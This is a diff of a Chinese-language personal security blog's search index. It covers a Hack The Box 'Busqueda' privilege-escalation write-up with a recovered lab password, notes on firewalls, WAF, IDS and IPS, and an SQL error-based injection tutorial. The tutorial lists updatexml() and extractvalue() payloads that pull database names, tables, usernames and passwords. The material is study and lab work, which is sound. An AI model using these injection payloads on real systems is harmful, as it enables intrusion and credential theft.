@@ -155,9 +155,9 @@
   <entry>
     <title>hack the box</title>
     <url>/2023/06/18/hack-the-box/</url>
-    <content><![CDATA[<p>下载htb的openvpn文件后，openvpn 文件</p>
+    <content><![CDATA[<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><p>下载htb的openvpn文件后，openvpn 文件</p>
 <p>目的是获取user.txt和root.txt</p>
-<h1 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h1><h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
+<h2 id="1-Busqueda-linux提权"><a href="#1-Busqueda-linux提权" class="headerlink" title="1.Busqueda(linux提权)"></a>1.Busqueda(linux提权)</h2><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/m0_56308852/article/details/130168742?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-5-130168742-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">htb busqueda wp要点记录_春猿火的博客-CSDN博客</a></p>
 <p><a href="https://blog.csdn.net/qq_58869808/article/details/130050438?ops_request_misc=%7B%22request_id%22:%22168587920116782425137143%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168587920116782425137143&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-130050438-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=Busqueda&spm=1018.2226.3001.4187">(87条消息) HTB Busqueda WriteUP_Som3B0dy的博客-CSDN博客</a></p>
 <p><a href="https://www.bilibili.com/video/BV1LV4y1Z7Wp/?spm_id_from=333.337.search-card.all.click">Hack The Box 赛季活动靶场【Busqueda】User &amp; System Flag攻略_哔哩哔哩_bilibili</a></p>
 <p><a href="https://blog.csdn.net/qq_37370714/article/details/130619426?ops_request_misc=&request_id=&biz_id=102&utm_term=Busqueda&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-130619426.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">(87条消息) HTB-Busqueda_永远是深夜有多好。的博客-CSDN博客</a></p>
@@ -257,7 +257,7 @@
 <p>尝试下cody后的东西作为密码</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">svc@busqueda:~$ echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">echo &quot;jh1usoih2bkjaspwe92&quot; | sudo -S -l</span><br><span class="line">[sudo] password for svc: Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#x76;&#x63;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#50;&#48;&#x38;">&#115;&#x76;&#x63;&#x40;&#x31;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#49;&#x2e;&#50;&#48;&#x38;</a>，ssh连接即可。</p>
+<p>jh1usoih2bkjaspwe92确实是密码。账号为<a href="mailto:&#115;&#x76;&#99;&#x40;&#49;&#48;&#x2e;&#x31;&#x30;&#x2e;&#49;&#x31;&#x2e;&#x32;&#48;&#56;">&#115;&#x76;&#99;&#x40;&#49;&#48;&#x2e;&#x31;&#x30;&#x2e;&#49;&#x31;&#x2e;&#x32;&#48;&#56;</a>，ssh连接即可。</p>
 <h3 id="svc-gt-root"><a href="#svc-gt-root" class="headerlink" title="svc-&gt;root"></a>svc-&gt;root</h3><p>登录进来后</p>
 <p><code>sudo -l</code> 为了看看当前用户可执行的命令</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matching Defaults entries for svc on busqueda:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on busqueda:</span><br><span class="line">    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *</span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -5970,7 +5970,7 @@
 <p>之后改改主机上的.ssh&#x2F;config，配置如下</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    HostName ssh.github.com</span><br><span class="line">    Port 443</span><br><span class="line">    User git</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa</span><br><span class="line">#centos	</span><br><span class="line">Host 192.168.1.89</span><br><span class="line">    Hostname 192.168.1.89</span><br><span class="line">    User root</span><br><span class="line">    IdentityFile ~/.ssh/id_rsa_centos</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<h1 id="三、git-T-x67-105-x74-64-x67-105-x74-x68-117-98-46-99-111-109-出错"><a href="#三、git-T-x67-105-x74-64-x67-105-x74-x68-117-98-46-99-111-109-出错" class="headerlink" title="三、git -T &#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#46;&#99;&#111;&#109;出错"></a>三、git -T <a href="mailto:&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#46;&#99;&#111;&#109;">&#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#x68;&#117;&#98;&#46;&#99;&#111;&#109;</a>出错</h1><p><code>kex_exchange_identification: Connection closed by remote host</code></p>
+<h1 id="三、git-T-103-x69-x74-64-103-105-x74-x68-x75-98-46-x63-x6f-x6d-出错"><a href="#三、git-T-103-x69-x74-64-103-105-x74-x68-x75-98-46-x63-x6f-x6d-出错" class="headerlink" title="三、git -T &#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;出错"></a>三、git -T <a href="mailto:&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;">&#103;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#x6f;&#x6d;</a>出错</h1><p><code>kex_exchange_identification: Connection closed by remote host</code></p>
 <p>我的是因为上面config里，手写成了<code>HostName github.com</code>，少一个 <code>ssh.</code> 啊</p>
 ]]></content>
       <categories>
@@ -10559,6 +10559,47 @@
       </tags>
   </entry>
   <entry>
+    <title>安全产品</title>
+    <url>/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
+    <content><![CDATA[<p>作用，原理，部署位置</p>
+<h1 id="一、WF"><a href="#一、WF" class="headerlink" title="一、WF"></a>一、WF</h1><p>基础防火墙</p>
+<p>主要是可实现基本包过滤策略的防火墙，限制对IP:port的访问。</p>
+<p>基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</p>
+<p> FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。</p>
+<p>公共网络&lt;-边界路由器与核心交换机之间-&gt;(用户工作区、服务器组群)</p>
+<h1 id="二、WAF"><a href="#二、WAF" class="headerlink" title="二、WAF"></a>二、WAF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</p>
+<p>流量识别、攻击检测、攻击响应、日志记录</p>
+<h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><strong>部署时要使WAF尽量靠近WEB服务器</strong>，对基于HTTP协议的通信进行检测和识别。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p>
+<p>sqlmap可以识别waf种类。</p>
+<p> 透明代理模式、反向代理模式、路由代理模式及端口镜像模式。</p>
+<p>前三种模式为线上，串行部署web服务器前端，检测并阻断异常流量。</p>
+<p>端口镜像模式将WAF旁路接在WEB服务器上游的交换机上，只用于检测异常流量。</p>
+<h1 id="三、IDS-被动"><a href="#三、IDS-被动" class="headerlink" title="三、IDS(被动)"></a>三、IDS(<strong>被动</strong>)</h1><p>IDS（入侵检测系统）就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性</p>
+<p><strong>特点是不阻断任何网络访问，主要以提供报告和事后监督为主</strong></p>
+<p><strong>以旁路为主</strong></p>
+<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>实时监测、安全审计、主动响应</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.信息收集</p>
+<p>收集的内容包括系统、网络、数据及用户活动的状态和行为</p>
+<p>2.数据分析</p>
+<p>模式匹配：收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</p>
+<p>统计分析：统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生</p>
+<p>完整性分析：主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。</p>
+<h1 id="四、IPS（主动）"><a href="#四、IPS（主动）" class="headerlink" title="四、IPS（主动）"></a>四、IPS（主动）</h1><p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong>(主要为模式匹配)</p>
+<p>缺点在于<strong>不能主动的学习</strong>攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许访问的。</p>
+<p><strong>常被串接在主干路上</strong></p>
+<h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>通过直接嵌入到网络流量中，利用一个网络端口接收外部流量，经过检查确认其中不包含异常活动或可疑内容，再通过另一个端口转发给内部系统（实际是对恶意流量进行清洗）。</p>
+<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>过滤器，能够防止各种攻击</p>
+]]></content>
+      <categories>
+        <category>安全产品</category>
+      </categories>
+      <tags>
+        <tag>WF</tag>
+        <tag>WAF</tag>
+        <tag>IPS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>实战记录</title>
     <url>/2023/07/01/%E5%AE%9E%E6%88%98/</url>
     <content><![CDATA[<h1 id="1-web1"><a href="#1-web1" class="headerlink" title="1.web1"></a>1.web1</h1><h2 id="access注入"><a href="#access注入" class="headerlink" title="access注入"></a>access注入</h2><p>Access数据库中没有注释符号.因此 &#x2F;**&#x2F; 、 – 和 # 都没法使用。<br>Access是小型数据库，当容量到达100M左右的时候性能就会开始下降。<br>Access数据库不支持错误显示注入，Access数据库不能执行系统命令。</p>
@@ -10665,47 +10706,6 @@
       </categories>
       <tags>
         <tag>挖洞</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安全产品</title>
-    <url>/2023/07/01/%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
-    <content><![CDATA[<p>作用，原理，部署位置</p>
-<h1 id="一、WF"><a href="#一、WF" class="headerlink" title="一、WF"></a>一、WF</h1><p>基础防火墙</p>
-<p>主要是可实现基本包过滤策略的防火墙，限制对IP:port的访问。</p>
-<p>基本上的实现都是默认情况下关闭所有的通过型访问，只开放允许访问的策略。FW可以拦截低层攻击行为，但对应用层的深层攻击行为无能为力。</p>
-<p> FW部署位置一般为外联出口或者区域性出口位置，对内外流量进行安全隔离。</p>
-<p>公共网络&lt;-边界路由器与核心交换机之间-&gt;(用户工作区、服务器组群)</p>
-<h1 id="二、WAF"><a href="#二、WAF" class="headerlink" title="二、WAF"></a>二、WAF</h1><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><p>WAF对请求的内容进行规则匹配、行为分析等识别出恶意行为，并执行相关动作，这些动作包括阻断、记录、告警等。</p>
-<p>流量识别、攻击检测、攻击响应、日志记录</p>
-<h2 id="位置"><a href="#位置" class="headerlink" title="位置"></a>位置</h2><p><strong>部署时要使WAF尽量靠近WEB服务器</strong>，对基于HTTP协议的通信进行检测和识别。通俗的说，WAF类似于地铁站的安检，对于HTTP请求进行快速安全检查，通过解析HTTP数据，在不同的字段分别在特征、规则等维度进行判断，判断的结果作为是否拦截的依据从而决定是否放行。</p>
-<p>sqlmap可以识别waf种类。</p>
-<p> 透明代理模式、反向代理模式、路由代理模式及端口镜像模式。</p>
-<p>前三种模式为线上，串行部署web服务器前端，检测并阻断异常流量。</p>
-<p>端口镜像模式将WAF旁路接在WEB服务器上游的交换机上，只用于检测异常流量。</p>
-<h1 id="三、IDS-被动"><a href="#三、IDS-被动" class="headerlink" title="三、IDS(被动)"></a>三、IDS(<strong>被动</strong>)</h1><p>IDS（入侵检测系统）就是依照一定的安全策略，对网络、系统的运行状况进行监视，尽可能发现各种攻击企图、攻击行为或者攻击结果，以保证网络系统资源的机密性、完整性和可用性</p>
-<p><strong>特点是不阻断任何网络访问，主要以提供报告和事后监督为主</strong></p>
-<p><strong>以旁路为主</strong></p>
-<h2 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h2><p>实时监测、安全审计、主动响应</p>
-<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.信息收集</p>
-<p>收集的内容包括系统、网络、数据及用户活动的状态和行为</p>
-<p>2.数据分析</p>
-<p>模式匹配：收集到的信息与已知的网络入侵和系统误用模式数据库进行比较，从而发现违背安全策略的行为</p>
-<p>统计分析：统计正常使用时的一些测量属性（如访问次数、操作失败 次数和延时等）。测量属性的平均值将被用来与网络、系统的行为进行比 较，任何观察值如果超过了正常值范围，就认为有入侵发生</p>
-<p>完整性分析：主要关注某个文件或对象是否被更改，这经常包括文件和 目录的内容及属性，它在发现被修改成类似特洛伊木马的应用程序方面特 别有效。</p>
-<h1 id="四、IPS（主动）"><a href="#四、IPS（主动）" class="headerlink" title="四、IPS（主动）"></a>四、IPS（主动）</h1><p> 解决了IDS无法阻断的问题，基本上以在线模式为主，系统提供多个端口，以透明模式工作。<strong>本质是增强入侵行为库，检测出后自动进行防御</strong>(主要为模式匹配)</p>
-<p>缺点在于<strong>不能主动的学习</strong>攻击方式，对于模式库中不能识别出来的攻击，默认策略是允许访问的。</p>
-<p><strong>常被串接在主干路上</strong></p>
-<h2 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h2><p>通过直接嵌入到网络流量中，利用一个网络端口接收外部流量，经过检查确认其中不包含异常活动或可疑内容，再通过另一个端口转发给内部系统（实际是对恶意流量进行清洗）。</p>
-<h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>过滤器，能够防止各种攻击</p>
-]]></content>
-      <categories>
-        <category>安全产品</category>
-      </categories>
-      <tags>
-        <tag>WF</tag>
-        <tag>WAF</tag>
-        <tag>IPS</tag>
       </tags>
   </entry>
   <entry>
@@ -15176,33 +15176,6 @@
       </tags>
   </entry>
   <entry>
-    <title>sql注入之报错注入</title>
-    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
-<p><strong>extravtvalue()</strong></p>
-<p>floor()、rand()…主键重复方式，暂时不展开</p>
-<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
-<blockquote>
-<p>XML_document:是字符串String格式，为XML文档对象名称</p>
-<p>Xpath_string:Xpath格式的字符串</p>
-<p>new_value:string格式，替换查找到的符合条件的数据</p>
-</blockquote>
-<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>web漏洞</category>
-        <category>sql注入</category>
-      </categories>
-      <tags>
-        <tag>报错注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sql注入之联合注入</title>
     <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[<h2 id="联合注入的定义、过程，及效果"><a href="#联合注入的定义、过程，及效果" class="headerlink" title="联合注入的定义、过程，及效果"></a>联合注入的定义、过程，及效果</h2><p>使用联合查询进行注入的一种方式，是一种高效的注入的方式，适用于有回显同时数据库软件版本是5.0以上的MYSQL数据库。至于为什么需要版本是5.0以上的MYSQL数据库，是因为MYSQL会有一个系统数据库information_schema，能很快的通过几条注入语句获取到想要的数据。</p>
@@ -15245,6 +15218,33 @@
       </categories>
       <tags>
         <tag>联合注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sql注入之报错注入</title>
+    <url>/2023/05/20/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><p>**updatexml()**，注意，该函数最多显示32位，必要时搭配substr()函数使用</p>
+<p><strong>extravtvalue()</strong></p>
+<p>floor()、rand()…主键重复方式，暂时不展开</p>
+<h2 id="报错注入思想"><a href="#报错注入思想" class="headerlink" title="报错注入思想"></a>报错注入思想</h2><p>语法格式：updatexml(XML_document,Xpath_string,new_value)</p>
+<blockquote>
+<p>XML_document:是字符串String格式，为XML文档对象名称</p>
+<p>Xpath_string:Xpath格式的字符串</p>
+<p>new_value:string格式，替换查找到的符合条件的数据</p>
+</blockquote>
+<p>如果人为构造Xpath_string格式错误，也就是我们将Xpath_string的值传递成不符合格式的参数<strong>（即出现了符号’~’或’^’,’!’等）</strong>，mysql就会报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询当前数据库的用户信息以及数据库版本信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,user(),0x7e,version(),0x7e),3) --+</span><br><span class="line">获取当前数据库下数据表信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3) --+</span><br><span class="line">获取users表名的列名信息：</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e),3) --+</span><br><span class="line">获取users数据表下username、password两列名的用户字段信息:</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select username from users limit 0,1),0x7e),3) --+</span><br><span class="line">?id=1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),3) --+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>语法格式：extractvalue()函数语法:extractvalue(XML_document,XPath_string)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">获取当前是数据库名称及使用mysql数据库的版本信息：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,database(),0x7e,version(),0x7e)) --+</span><br><span class="line">获取当前位置所用数据库的位置：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,@@datadir,0x7e)) --+</span><br><span class="line">获取表名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)) --+</span><br><span class="line">获取users表的列名：</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),0x7e)) --+</span><br><span class="line">获取对应的列名的信息(username/password):</span><br><span class="line">?id=1&quot; and extractvalue(1,concat(0x7e,(select username from users limit 0,1),0x7e)) --+</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>web漏洞</category>
+        <category>sql注入</category>
+      </categories>
+      <tags>
+        <tag>报错注入</tag>
       </tags>
   </entry>
   <entry>
@@ -18786,7 +18786,7 @@ return $outText;#新值
 <p>就是找到自己的静态页面仓库，点进去，把上面的<strong>地址栏url</strong>复制过去即可</p>
 <h2 id="search-xml错误"><a href="#search-xml错误" class="headerlink" title="search.xml错误"></a>search.xml错误</h2><p>访问..github.io&#x2F;search.xml，会报错</p>
 <p><img src="/../../../Typora/img111/image-20231022130218792.png"></p>
-<p>去在本地的search.xml文件下搜索到出现字符的文章，删掉即可</p>
+<p>f12，查看xml文件的响应内容，搜索到出现报错内容的字符，再去原md文件中删改即可</p>
 <p>以上是对我自己博客的解决方案</p>
 ]]></content>
       <categories>
